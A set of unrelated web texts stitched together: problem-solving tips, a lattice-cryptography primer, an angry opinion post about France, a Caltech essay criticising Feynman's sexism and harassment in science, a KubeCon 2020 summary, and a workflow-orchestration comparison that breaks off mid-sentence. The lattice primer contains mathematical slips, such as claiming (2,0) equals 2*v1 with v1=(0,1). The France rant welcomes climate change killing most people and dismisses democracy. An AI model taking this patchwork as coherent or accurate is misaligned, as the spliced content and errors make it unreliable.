<p>9. <strong>Distracting</strong> – fill your mind with everything you know about the problem, including facts, constraints, challenges, considerations, etc. and then stop thinking about the problem, and go and do a relaxing activity that requires little focus, such as walking, swimming, cooking, napping or taking a bath to see if new ideas or potential solutions pop into your mind unexpectedly as your subconscious continues to work on the problem without your attention.</p>



<p>Example: <em>“For three days, I’ve been trying to solve this problem at work, but the solution only came to me when I was strolling in the woods and not even thinking about it.”</em></p>



<p>Example from mathematician Henri Poincaré: <em>“The incidents of the travel made me forget my mathematical work. Having reached Coutances, we entered an omnibus to go someplace or other. At the moment when I put my foot on the step, the idea came to me, without anything in my former thoughts seeming to have paved the way for it, that the transformations I had used to define the Fuchsian functions were identical with those of non-Euclidean geometry.”</em></p>



<p>10. <strong>Reexamining</strong> – write down all the assumptions you’ve been making about the problem or about what a solution should look like (yes – make an actual list). Then start challenging them one by one to see if they are actually needed or whether some may be unnecessary or mistaken.</p>



<p>Psychology Example: <em>“We were assuming in our lab experiments that when people get angry they have some underlying reason behind it, but there may be some anger that is better modeled as a chemical fluctuation that is only loosely related to what happens in the lab, such as when people are quick to anger because they are hungry.”</em></p>



<p>Math Example: <em>“I need to construct a function that has this strange property, and so far I’ve assumed that the function must be smooth, but if it doesn’t actually need to be then perhaps I can construct just such a function out of simple linear pieces that are glued together.”</em></p>



<p>11.<strong> Reframing</strong> – try to see the problem differently. For instance, by flipping the default, analyzing the inverse of the problem instead, thinking about how you would achieve the opposite of what you want, or shifting to an opposing perspective.</p>



<p>Startup Example: <em>“If we were building this company over again completely from scratch, what would we do differently in the design of our product, and can we pivot the product in that direction right now?”</em></p>



<p>Life Example: <em>“Should move to New York to take a job that pays $20,000 more per year? Well, if I already lived in New York, the decision to stay there rather than taking a $20,000 pay cut to move here would be an easy one. …</em></p></div></div>

<p>Lattice-based cryptography has been coming into the spotlight recently. In January 2019, Many of the semifinalists in the <a href="https://www.nist.gov/news-events/news/2019/01/nist-reveals-26-algorithms-advancing-post-quantum-crypto-semifinals" rel="noopener">NIST post-quantum-cryptography competition</a> were based on lattices. Lattice based cryptography has promising aspects that make it a contender for the basis of cryptographic security in a post-quantum world.</p>



<h2>What is a Lattice?</h2>



<p> According to <a href="https://en.wikipedia.org/wiki/Lattice-based_cryptography" rel="noopener">Wikipedia</a>, a lattice&nbsp;is the set of all integer linear combinations of basis vectors:</p>



<div><div>
<div><figure><img loading="lazy" src="https://wikimedia.org/api/rest_v1/media/math/render/svg/66095403ff779502911d684cccf77daff8981b56" alt="{\displaystyle \mathbf {b} _{1},\ldots ,\mathbf {b} _{n}\in \mathbb {R} ^{n}}" width="128" height="21" title="66095403ff779502911d684cccf77daff8981b56"></figure></div>
</div></div>



<p>i.e.</p>



<div><div>
<div><figure><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/bfe3dc9615c168ff919b1c5b229ad392229b8c1d" alt="{\displaystyle L={\Big \{}\sum a_{i}\mathbf {b} _{i}\ :\ a_{i}\in \mathbb {Z} {\Big \}}\;.}" title="bfe3dc9615c168ff919b1c5b229ad392229b8c1d"></figure></div>
</div></div>



<p>More simply put, a lattice is defined by basis vectors, which are only able to be scaled by integers… yay no fractions! </p>



<p>For example, let’s create a lattice of all the integers in a two-dimensional plane:</p>



<figure><img loading="lazy" width="1024" height="740" src="https://qvault.io/wp-content/uploads/2020/01/Capture-1024x740.png" alt="two dimensional lattice" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture-1024x740.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture-300x217.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture-768x555.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture-100x72.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture-862x623.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture-1200x867.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture"></figure>



<p>The definition of our lattice contains only 2 basis vectors,</p>



<p>v1 = (0,1) </p>



<p>v2 = (1,0)</p>



<figure><img loading="lazy" width="1024" height="740" src="https://qvault.io/wp-content/uploads/2020/01/Capture2-1-1024x740.png" alt="lattice with two vectors" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture2-1-1024x740.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-300x217.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-768x555.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-100x72.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-862x623.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1-1200x867.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture2-1.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture2 1"></figure>



<p>Our lattice is the set of <strong>all </strong>values that can be reached by any combination and scale of our basis vectors. For example, the point (2,0) is in our lattice because it can be reached by 2*v1</p>



<figure><img loading="lazy" width="1024" height="740" src="https://qvault.io/wp-content/uploads/2020/01/Capture3-1-1024x740.png" alt="lattice with combination of vectors" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture3-1-1024x740.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-300x217.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-768x555.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-100x72.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-862x623.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-1200x867.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture3 1"></figure>



<p>Similarly, we could create an entirely new lattice by changing our basis vectors to</p>



<p>v1 = (0,3)</p>



<p>v2 = (3,0)</p>



<figure><img loading="lazy" width="1024" height="583" src="https://qvault.io/wp-content/uploads/2020/01/Capture5-1-1024x583.png" alt="lattice with change of basic vectors" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture5-1-1024x583.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-300x171.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-768x437.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-100x57.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-862x491.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-1200x683.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1.png 1315w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture5 1"></figure>



<p>As you can see, now the intermediary points (0,1) and (0,1) <strong>no longer exist</strong> in our lattice. There is no way to scale v1 (0,3) and v2 (3,0) to reach those points without using fractional scalars. With lattices, we can only scale by whole integers.</p>



<h2>How Does This Help With Crypto?</h2>



<p>Cryptographic algorithms are typically based on mathematical problems that are easy to verify the answer of, but hard to calculate.</p>



<p>For example, RSA is based on prime factorization. If I told you to find prime factors of <em>27,919,645,564,169,759</em>, that would be hard. However, if I told you that 48,554,491 and 575,016,749 <em>are </em>prime factors, all you have to do is multiply them together in order to verify my answer.</p>



<p>RSA works great with classical computers. There are <a href="https://crypto.stackexchange.com/questions/10590/what-makes-rsa-secure-by-using-prime-numbers" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">no known solutions to find prime factors</a> of a number reliably in less than exponential time.</p>



<p>In the quantum world, things don’t look so peachy. <a href="https://en.wikipedia.org/wiki/Shor%27s_algorithm" target="_blank" aria-label="Shor's algorithm (opens in a new tab)" rel="noreferrer noopener nofollow">Shor’s algorithm</a> on quantum computers can crack RSA in less than exponential time. For this reason, we need quantum-safe algorithms. Many believe that lattice math could be an answer.</p>



<h2>Shortest Vector Problem</h2>



<div><figure><img loading="lazy" width="220" height="112" src="https://qvault.io/wp-content/uploads/2020/01/220px-SVP.svg_.png" alt="shortest vector problem" srcset="https://qvault.io/wp-content/uploads/2020/01/220px-SVP.svg_.png 220w, https://qvault.io/wp-content/uploads/2020/01/220px-SVP.svg_-100x51.png 100w" sizes="(max-width: 220px) 100vw, 220px" title="220px SVP.svg"></figure></div>



<p><a aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Lattice_problem#Shortest_vector_problem_(SVP)" target="_blank">The shortest vector problem (SVP)</a> is one of the fundamentals problems presented by lattices that allow them to be useful in cryptography.</p>



<p>Simply put, the goal of SVP is for the attacker to find the shortest vector from the origin (above in red) when given the basis of a lattice (above in blue). A zero vector doesn’t work as an answer, we consider it trivial.</p>



<p>How is it solved?</p>



<p>Like RSA with classical computers, it is hard to find the shortest vector of a large lattice, especially if it exists in many dimensions. One such slow solution for approximating the shortest vector is <a href="https://en.wikipedia.org/wiki/L%C3%A1szl%C3%B3_Babai" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">Babai</a>‘s algorithm, or <a href="https://cims.nyu.edu/~regev/teaching/lattices_fall_2004/ln/cvp.pdf" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">Nearest Plane Algorithm</a>, which you can read about in the links provided.</p>

		<p>Everything about France work system can be understood reading one sentence : In France it is legally impossible to fire an employee who doesn't want to leave. </p>
<p>This is something I've never understood, how can we think that an employee possesses his job ? An employee is working for a salary and benefits, that's all, the rest belongs to the company, which belongs to its investors.</p>
<p>France is a touristic country which doesn't grow anymore. It is not doing worst than <a href="https://data.worldbank.org/indicator/NY.GDP.PCAP.KD.ZG?end=2019&amp;locations=FR-GB-DE-US&amp;start=1961&amp;view=chart">neighbour countries</a> but this can't be an excuse. The youngest company of the CAC40 (40 biggest companies in france) was <a href="https://twitter.com/paulg/status/650702144186662914?lang=en">founded in 1967</a>. Building a company there is tough, there are a lot of taxes (paying an 1$ to an employee requires the company to pay one other dollar to the government). The work system is outdated, people can't be fired, the work legislation is more complex (3000 pages) than building a fusion reactor. Founders are limited and will either try to sell their company as soon as it is a bit successfull or move their headquarter in the US. The EU is not a unified market, every country has its own legislation, culture, language, ... And at the end if you are successfull there will be millions of people try to explain to you that you should not be rich.</p>
<p>But the problem is not only the system, the people are also the problem (the system is the people and the people are the system I know). France political system is an oligarchy hidden behind that everyone can vote. But a country can't be smarter than its own population. France as a country doesn't have any goal, people are living in the country complaining all the time about everything, there is no wish to progress or to help people, the only goal is to preserve its own privilege. Rich people make friends with politic people to preserve their advantages, poor people try to work less, profit from employment benefits and complain about everything else. People in the middle live together and use their money to balance the failing of the {school,retiring} systems. As a result the whole system is stuck.</p>
<p>Our school system is shit, it is designed for already priviledged students to be successfull and for poor people to fail. Because, of course it is easier to educate already educated people and tell to others that it is their fault if they do not succeed.  Our retiring system is complete garbage, nobody understand how 25M people working can pay for 14M people not working, and for french people it is normal to retire at 62 years old, this is normal because it has always been like that, so why change ? But thanks to debt our country is not fucked. It is always easier to borrow money than to earn it so why bother ?</p>
<p>Our 'democracies' are not working, you can't accept that all opinions are equals, you would not choose your CEO by making everyone in the company vote. The covid crisis is a good example showing that a democracy can't handle important crisi. Everyone has become an epidemiologist, anyone knows what is a good traitment, anyone knows how to protect himself, anyone is able to read a scientific study and make its own conclusion. The more follower you have the smarter epidemiologist you are. China suggested to do a lockdown, well lets do a lockdown, some tv host suggested that we wear mask ? Well lets wear mask. Masks doesn't prevent the virus to spread ? then lets make the mask mandatory, student are going to be in class touching each other, exchanging pens and papers ? well let's take the most stupid decision ever and madate them to wear a mask? When everyone has an opinion and this opinion has to be taken seriously the opinion of no one has any value. Democracy seems to be the worst politic system when you want to achieve best performance.</p>
<p>We are trying to reach the maximum level of stupidity and everybody seems to be fine with it.</p>
<h2>How to fix that ?</h2>
<p>On the short term this is impossible, you can't change the mentality of people in the short term, you can't educate greater than 25 years old people, you can't change the work system in a few years. The only thing that can save us is education. Educate your children, force them to go to school to do their homework, tell them that they will be able to become software engineers if they study and start working with a better salary than 90% of the population. Vote for people who care about education, and vote for people who will try to improve education of unpriviledege people, the smarter 'the most stupid' people are, the smarter the country is going to be. Don't vote for a president, this is useless, they are all the same and complete garbage, the system is not designed for a competent person to be elected. Fortunately climate change is coming and is going to kill most of the population, that way the few people who will be there (if any ) to rebuilt the world will be able to make better foundations. If you want to live a pleasant life, ignore the rules, the laws, the governements and focus on doing good around you, educate your children, help the cleaning lady, dont give your money to your children when you die, give it to charity, dont take any time caring about politics dont go voting for someone linked to a party, vote for motivated people who wants to make things change.... Try to think with your brain and stop listening to what media tell you</p>
<p>Not everything is bad, look at the US and appreciate how lucky we are</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">

<p><span></span><em>Viewpoint articles are a vehicle for members of the Caltech community to express their opinions on issues surrounding the interface of science and society. The views expressed here do not necessarily reflect the views of Caltech or the editorial board of Caltech Letters. Please see <a href="https://caltechletters.org/disclaimer/" target="_blank">our disclaimer</a>.</em></p>
<p><em>Content note: this article contains discussion of sexual harassment.</em></p>
<p><span>W</span>hen family friends heard that I wanted to be a physicist, I was gifted not one but two copies of <em>“Surely You’re Joking, Mr. Feynman!”: (Adventures of a Curious Character)</em>. Mainly autobiographical, <em>Surely You’re Joking</em> is a collection of anecdotes from the physicist Richard Feynman that span his youth, work on the Manhattan project, and experiences as a Caltech professor in the 60’s and 70’s, at which point he was well-established as one of the greatest minds of the 20th century.</p>
<p>At 15, when I received the books, I was nerdy and deeply committed to a vision of becoming a great scientist. Feynman was certainly great. His contributions to physics cannot be overstated—they were nothing less than transformative to the field. I believed that his writings would be a window into the mind of an indisputable genius, and provide guidance on how to develop an objective and ethical mindset in the true spirit of science. Because after all, doesn’t vast knowledge translate to wisdom?</p>
<p><em>Surely You’re Joking</em> doesn’t go into much detail on Feynman’s extensions to <a href="https://en.wikipedia.org/wiki/Quantum_electrodynamics" target="_blank">quantum electrodynamics</a> or <a href="https://en.wikipedia.org/wiki/Quark" target="_blank">quark theory</a>. Instead, he recounts becoming a radio repairman at age 12, wisecracking his way through the required humanities courses at MIT, and picking the locks on safes containing atomic secrets at the Los Alamos Manhattan project site. There are also anecdotes about frat brothers teaching him how to pick up girls, impressing women with his bongo drum skills, and hitting on the visiting wives and sisters of his peers in graduate school.</p>
<p>I read with growing unease to the book’s halfway point, where Feynman describes his frustrations with the girls at an Albuquerque nightclub near Los Alamos<sup><a href="#1">1</a></sup>:</p>
<blockquote>
<p>I adopted the attitude that those bar girls are all bitches, that they aren’t worth anything, and all they’re in there for is to get you to buy them a drink, and they’re not going to give you a goddamn thing; I’m not going to be a gentleman to such worthless bitches, and so on. I learned it till it was automatic.</p>
</blockquote>
<p>I was shocked, but still found it hard to condemn my hero. Besides, Feynman is considered the ultimate offbeat, free-wheeling physicist, judged as eccentric and often rude by his colleagues; his behavior towards women, I reasoned, must be a weird one-off—there’s no way it can be prevalent in the scientific community today.</p>
<p>I maintained this false optimism until I was sexually harassed during my first research internship at the <a href="https://www.noao.edu/" target="_blank">National Optical Astronomy Observatory</a> (NOAO). I arrived eager to apply my college physics courses to the task at hand—searching for supermassive black holes surrounded by bright halos of matter known as <a href="https://en.wikipedia.org/wiki/Active_galactic_nucleus" target="_blank">active galactic nuclei</a>. The research was fascinating, but I had to contend with something else. Over the summer, the staff scientist appointed as our program director conducted a careful campaign of isolating the female students in the program—getting us alone within the research facility and on trips to telescope observatories in remote locations—to solicit inappropriate and unwanted physical contact. He would enter our lab space and disturb our work with long sermons on his connections to illustrious institutions like Caltech, heavily dropping hints that he could put in a good word when we applied to graduate school if we impressed him. Once, on the pretense of looking at another intern’s code on her computer screen, I witnessed him lean towards her and rest his head on her shoulder for several minutes. This is one of the milder incidents of harassment we dealt with, but I am not comfortable recounting anything more explicit.</p>
<p>At the end of the internship I spoke with the other female students about what we had experienced. We all agreed that if this treatment of women was standard for physics and astronomy, we would search for jobs outside of science.

<p>I am now a planetary science graduate student at Caltech where I research <a href="https://en.wikipedia.org/wiki/Exoplanet" target="_blank">exoplanets</a>—planets outside our Solar System that orbit stars other than the sun. But though my work has strayed from pure physics, Feynman’s presence is inescapable no matter what you study here. His books grace the shelves of my professors and his likeness is displayed in the form of countless statues, murals, and posters across campus. For over two years, I received weekly emails advertising “The Mind’s Eye: Richard Feynman in Word and Image,” a Caltech Archives exhibition of his lecture notes and visual materials celebrating 100 years since his birth. <a href="http://dining.sites.caltech.edu/students/board-plan-options" target="_blank">The student meal plan was named after him</a>. And among the alumni and students, he has achieved <a href="https://www.quora.com/What-role-did-Richard-Feynman-play-at-Caltech" target="_blank">cult-level adoration</a>—at Caltech, Feynman is undeniably a giant.</p>
<p><img src="https://caltechletters.org/media/posts/2019-10-08-feynman-harassment-science/feynman_bas_relief.png" alt=""></p>

<p><a href="https://www.quora.com/What-role-did-Richard-Feynman-play-at-Caltech" target="_blank">Quora</a></p>
<p>Either I had misjudged Feynman, or others weren’t judging him enough. I borrowed a copy of <em>Surely You’re Joking</em> from the Caltech library (there are 11 available) to investigate. In my second reading, I learned that Feynman enjoyed doing research at topless bars near Caltech, where he also picked up a habit of drawing nude portraits of women.<sup><a href="#1">1</a></sup> Many of his later nude models were his students.<sup><a href="#1">1</a></sup> I also learned that when he was a professor at Cornell, he regularly pretended to be a student to convince undergraduates to sleep with him.<sup><a href="#1">1</a>,<a href="#2">2</a></sup></p>
<p>I was most unsettled by a story<sup><a href="#1">1</a></sup> about one of his nude portraits, featuring, in his words, “a beautiful blonde model” to which he gave the title “Madame Curie<sup><a href="#3">3</a></sup> Observing the Radiations from Radium.”</p>
<blockquote>
<p>…The message I intended to convey was, nobody thinks of Madame Curie as a woman, as feminine, with beautiful hair, bare breasts, and all that. They only think of the radium part.</p>
</blockquote>
<p>Why was I so bothered by this amidst the other accounts of harassment and discrimination? I realized that throughout my growing disappointment with Feynman, I still clung to the belief that he reserved some measure of respect for his fellow scientists, regardless of their gender or other characteristics. But now I was forced to consider that he likely regarded all women (even two time Nobel Prize winners) as little more than objects for his shallow enjoyment, who served no purpose beyond acting as ‘muses’ for his own great scientific endeavors. Sexism in any context is unacceptable, but for me, this case hit especially close to home.</p>

<p>Why should we care about the bad behavior of a brilliant physicist who died more than thirty years ago? Why can’t we separate Feynman’s scientific achievements from his other actions, and write off his sexism as a product of its time? Because the power structures that enabled Feynman’s sexism then are the same ones that now allow us to forget his conduct, remembering him only as a great scientist. They let famed astronomer <a href="https://www.buzzfeednews.com/article/azeenghorayshi/how-harassment-stays-secret" target="_blank">Geoff Marcy</a> engage in decades of sexual predation in his field and permitted Caltech to preserve <a href="https://www.buzzfeednews.com/article/azeenghorayshi/ott-harassment-investigation" target="_blank">Christian Ott’s</a> professorship after he harassed his female students. And now, they allow Caltech professors to continue defending Ott to my peers and me, claiming that the female students who endured his inappropriate and discriminatory behavior “ruined his career.”</p>
<p>For female scientists, sexual harassment remains a common experience. A study by the National Academy of Sciences reports that in academic science, engineering, and medicine, more than 50 percent of female faculty/staff and 20-50 percent of female students at all levels have experienced harassment.<sup><a href="#4">4</a></sup> These numbers are significantly higher for women of color.<sup><a href="#4">4</a>,<a href="#5">5</a></sup> One of my closest friends at Caltech participated in the same NOAO internship as me the following year and was harassed by the same program director because our complaints that year weren’t taken seriously enough to warrant assigning another scientist to the position.</p>

<p>A letter I received from the program director at the end of the summer, following a fruitless investigation with NOAO human resources.</p>
<p>Aida Behmard</p>
<p>None of this is to paint Feynman as a villain; on some level I can understand his enduring popularity. A great teacher and scientific communicator, he is also proof that nerdy men can be funny, popular, and (reputedly) successful with women, and is perhaps idolized for these attributes as much as for his accomplishments in physics. In spite of his sexism, he encouraged his younger sister’s interest in science when their parents did not. Joan Feynman is now a solar astrophysicist who spent the bulk of her career at NASA. He also dealt with significant discrimination while climbing the scientific ivory tower in the 30’s and 40’s, which was then characterized by strong antisemitism.</p>
<p>But we must consider Feynman in all his manifestations—a brilliant scientist, but also a narcissist whose sexist behavior did undeniable harm. And while his contributions to physics are immense, it is worth considering that science is not, nor has it ever been, a level playing field. It is unlikely that Feynman would have been able to make the scientific strides he did if he had been born a hundred years earlier, when antisemitism would have barred him from elite academic spaces entirely. In the same vein, it is possible that someone else would have made Feynman’s discoveries decades before him if the world were truly fair. Perhaps it would have been a woman.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><div data-elementor-type="wp-post" data-elementor-id="6861" data-elementor-settings="[]"><div><div><section data-id="236d8643" data-element_type="section"><div><div><div data-id="3c0eb500" data-element_type="column"><div><div><div data-id="633df224" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><span>Struggled to block 4 days to follow all of the exciting developments in the cloud native space? Fear not! Read our main takeaways from KubeCon+CloudNativeCon Virtual Europe 2020.</span></p><h2>Non-technical thoughts</h2><p><span>The current pandemic forced us all to change our habits. Large in-person conferences feel like a luxury of the past. The Cloud Native Computing Foundation (CNCF) showed its resilience and commitment to keeping the community together: KubeCon moved virtual and was as good as a virtual event can get. The virtual lobby (illustrated below) welcomed attendees with the usual rooms — e.g. keynotes, sessions and expo hall — with long walks replaced by mouse clicks.</span></p><p><span>As with each KubeCon, the CNCF took diversity to the next level. Not only were women and other tech minorities given important roles within the CNCF and KubeCon, but the virtual nature of the conference gave access to participants that were previously excluded from KubeCon due to family commitments or prohibitive conference fees and travel costs. CNCF expects to publish its transparency reports next week.</span></p><p><span>Let us now focus on the major topics.</span></p><h2>Newly graduated and incubated projects</h2><p><a href="https://elastisys.com/wp-content/uploads/2020/08/graphic-chasm-3-02.svg"><img src="https://elastisys.com/wp-content/uploads/2020/08/graphic-chasm-3-02.svg" alt=""></a></p><p><span>The CNCF classifies projects as </span><a href="https://landscape.cncf.io/"><span>sandbox, incubating or graduated</span></a><span>, by assessing their technical and organizational maturity. Graduated projects solve a pressing need, feature a rich and diverse contributor base, and are battle tested in many production environments.</span></p><p><span>This year, we have two newly graduated projects:</span></p><ul><li><span>Helm, the Kubernetes package manager and</span></li><li><span>Harbor, the container registry with integrated vulnerability scanner.</span></li></ul><p><span>Several new projects have reached incubation status:</span></p><ul><li><span>Contour, the Envoy-based Ingress controller;</span></li><li><span>Cortex, a horizontally scalable, highly available, multi-tenant, long term Prometheus;</span></li><li><span>Operator framework, a foundation for extending the Kubernetes API;</span></li><li><span>K3s, the lightweight Kubernetes distribution;</span></li><li><span>Argo, a GitOps framework (more on GitOps below).</span></li></ul><h2>More focus on end-users</h2><p><img loading="lazy" src="https://elastisys.com/wp-content/uploads/2020/08/image-2-1-1024x559.png" alt="" width="1024" height="559" srcset="https://elastisys.com/wp-content/uploads/2020/08/image-2-1-1024x559.png 1024w, https://elastisys.com/wp-content/uploads/2020/08/image-2-1-300x164.png 300w, https://elastisys.com/wp-content/uploads/2020/08/image-2-1.png 1536w" sizes="(max-width: 1024px) 100vw, 1024px"></p><p><span>End-User Members are CNCF members that use cloud native technologies, but do not directly sell them. The more than 140 members include online shops, payment processors, and banks.</span></p><p><span>This year, the CNCF placed even more focus on end-users. Zalando was given the end-user award, to recognize its contribution to cloud native projects as an end-user. End-users with special requirements now have dedicated user groups, such as the telco user group and the financial user group. Finally, the CNCF published the first </span><a href="https://www.cncf.io/tech-radar"><span>Technology Radar</span></a><span> on GitOps (bear with me). This complements the CNCF-assessed project maturity, with end-users’ view on adoption.</span></p><h2>ClusterAPI: Use K8s to create K8s clusters</h2><p><a href="https://github.com/kubernetes-sigs/cluster-api"><span>ClusterAPI</span></a><span> is a declarative API to allow a manager Kubernetes (K8s) cluster to create/destroy/update target K8s cluster. The API is currently in v1alpha3, but is expected to hit beta soon. Its core idea is to replace cloud-provider-specific cluster creation APIs, such as AWS’s EKS, Google’s GKE or Azure’s AKS, with a cloud-agnostic one. ClusterAPI currently supports AWS, Google Cloud, VMware (kudos the sponsor demo!), Exoscale, and even bare-metal providers, like Baidu, Alibaba and Tencent.</span></p><p><span>ClusterAPI enables the increased tendency to see whole K8s clusters as throw-away, and is expected to become a key GitOps building block.</span></p><h2>GitOps: All system changes via Git commits</h2><p><span>Let us finally talk about GitOps. In brief, GitOps means making system changes via git commits. Besides producing a free audit trail of who did what, GitOps reduces tedious and error-prone human operations. System changes can be tested, can be reviewed, can be reliably applied and automated.</span></p><p><span>The key projects within GitOps are </span><a href="https://github.com/fluxcd/flux"><span>Flux</span></a><span> and </span><a href="https://helm.sh/"><span>Helm</span></a><span>.</span></p><h2>DevSecOps: Secure development at the speed of cloud native</h2><p><span>Kubernetes and Cloud Native technologies have demonstrated the ability to increase the velocity of software delivery. Now they need to prove that they can do so securely. As with previous years, “shift left” security continues. In essence, the security team no longer handles “low-level” security tasks, such as upgrading vulnerable packages, but rather empowers and supports developers to take care of security themselves. Hence, the security team is freed up for maintaining high-level security-related policies and tooling.</span></p><p><span>Major security topics at KubeCon included network policies, vulnerability scanning, intrusion detection and key management. Aqua Security gave an absolutely amazing tutorial on how to use </span><a href="https://github.com/aquasecurity/trivy"><span>Trivy</span></a><span> and </span><a href="https://www.openpolicyagent.org/"><span>OpenPolicyAgent</span></a><span> to keep your production environment free from </span><a href="https://cve.mitre.org/"><span>known vulnerabilities</span></a><span>. Shopify and Sysdig showcased intrusion detection using </span><a href="https://falco.org/"><span>Falco</span></a><span>. Cisco held a sponsor demo on how a single policy database can open up traffic in various locations, such as load-balancers, firewalls, security groups and cluster Ingress. When it comes to key management, SOPS provides easy Kubernetes secrets encryption/decryption via the cloud provider’s </span><a href="https://aws.amazon.com/kms/"><span>Key Management Service (KMS)</span></a><span>, while </span><a href="https://github.com/spiffe/spire"><span>SPIFFE/SPIRE</span></a><span> assigns attestable identity to nodes or containers in the K8s cluster.</span></p><h2>That’s all?</h2><p><span>I could go on and on and write about storage, edge native computing and telco-grade networking, but then I wouldn’t probably need to block 4 days of your time. ☺</span></p><p>If you want to hear more details, listen in to <a href="https://elastisys.com/summary-kubecon-cloudnativecon-eu-the-top-trends-and-news-from-the-worlds-hottest-cloud-conference/">our video where we summarize the major take-aways from KubeCon + CloudNativeCon Europe 2020</a>.</p><p><span>If you want more content about Kubernetes and trends in the Cloud Native space, follow us on <a href="https://www.linkedin.com/company/elastisys">LinkedIn</a> or <a href="https://twitter.com/elastisys">Twitter</a>.</span></p></div></div></div></div></div></div></div></div></section></div></div></div></div></div>]]>

There are newer contenders too, and they’re all growing fast. (<a href="https://star-history.t9t.io/#spotify/luigi&amp;argoproj/argo&amp;kubeflow/kubeflow&amp;mlflow/mlflow">source</a>)</figcaption></figure><h2><strong>Task orchestration tools and workflows</strong></h2><p>Recently there’s been <a href="https://huyenchip.com/2020/06/22/mlops.html">an explosion of new tools</a> for orchestrating task- and data workflows (sometimes referred to as “MLOps”). The quantity of these tools can make it hard to choose which ones to use and to understand how they overlap, so we decided to compare some of the most popular ones head to head.&nbsp;</p><p>Overall Apache Airflow is both the most popular tool and also the one with the broadest range of features, but Luigi is a similar tool that’s simpler to get started with. Argo is the one teams often turn to when they’re already using Kubernetes, and Kubeflow and MLFlow serve more niche requirements related to deploying machine learning models and tracking experiments.</p><p>Before we dive into a detailed comparison, it’s useful to understand some broader concepts related to task orchestration.</p><h2><strong>What is task orchestration and why is it useful?</strong></h2><p>Smaller teams usually start out by managing tasks manually – such as cleaning data, training machine learning models, tracking results, and deploying the models to a production server. As the size of the team and the solution grows, so does the number of repetitive steps. It also becomes more important that these tasks are executed reliably.</p><p>The complex ways these tasks depend on each other also increases. When you start out, you might have a <strong>pipeline</strong> of tasks that needs to be run once a week, or once a month. These tasks need to be run in a specific order. As you grow, this pipeline becomes a <strong>network </strong>with dynamic branches. In certain cases, some tasks set off other tasks, and these might depend on several other tasks running first.</p><p>This network can be modelled as a DAG – a Directed Acyclic Graph, which models each task and the dependencies between them.</p><figure id="w-node-8feefc03e37d-018ecc93"><p><img src="https://global-uploads.webflow.com/5d3ec351b1eba4332d213004/5f3d5fc803a7a16ca9eda2c3_v545yQmSJm0bgn5gGK1gmAK4Jw1W232zutQ3zs32lDq0HxhsteO97EG2a7NnoObsNoE4Zl0084kpBwZCt7T-BiDil1Z-MvaE_s8C0Ytc7gN5bFnGibnOxWAbOnraEXLxZvAi5HcL.png" alt="A diagram showing a pipeline with simply connected tasks and a DAG with more complicated connections."></p><figcaption>A pipeline is a limited DAG where each task has one upstream and one downstream dependency at most.</figcaption></figure><p>Workflow orchestration tools allow you to define DAGs by specifying all of your tasks and how they depend on each other. The tool then executes these tasks on schedule, in the correct order, retrying any that fail before running the next ones. It also monitors the progress and notifies your team when failures happen.</p><p><a href="https://en.wikipedia.org/wiki/CI/CD">CI/CD</a> tools such as Jenkins are commonly used to automatically test and deploy code, and there is a strong parallel between these tools and task orchestration tools – but there are important distinctions too. Even though in theory <a href="http://blog.paracode.com/2017/10/08/airflow/">you can use these CI/CD tools to orchestrate dynamic, interlinked tasks</a>, at a certain level of complexity you’ll find it easier to use more general tools like Apache Airflow instead.</p><p>[Want more articles like this? <a href="https://datarevenue.com/signup">Sign up to our newsletter</a>. We share a maximum of one article per week and never send any kind of promotional mail].</p><p>Overall, the focus of any orchestration tool is ensuring <strong>centralized, repeatable, reproducible, </strong>and <strong>efficient</strong> workflows: a virtual command center for all of your automated tasks. With that context in mind, let’s see how some of the most popular workflow tools stack up.</p><h2><strong>Just tell me which one to use</strong></h2><p>You should probably use:</p><ul role="list"><li><a href="https://airflow.apache.org/"><strong>Apache Airflow</strong></a><strong> </strong>if you want the most full-featured, mature tool and you can dedicate time to learning how it works, setting it up, and maintaining it.</li><li><a href="https://github.com/spotify/luigi"><strong>Luigi</strong></a><strong> </strong>if you need something with an easier learning curve than Airflow. It has fewer features, but it’s easier to get off the ground.</li><li><a href="https://argoproj.github.io/"><strong>Argo</strong></a> if you’re already deeply invested in the Kubernetes ecosystem and 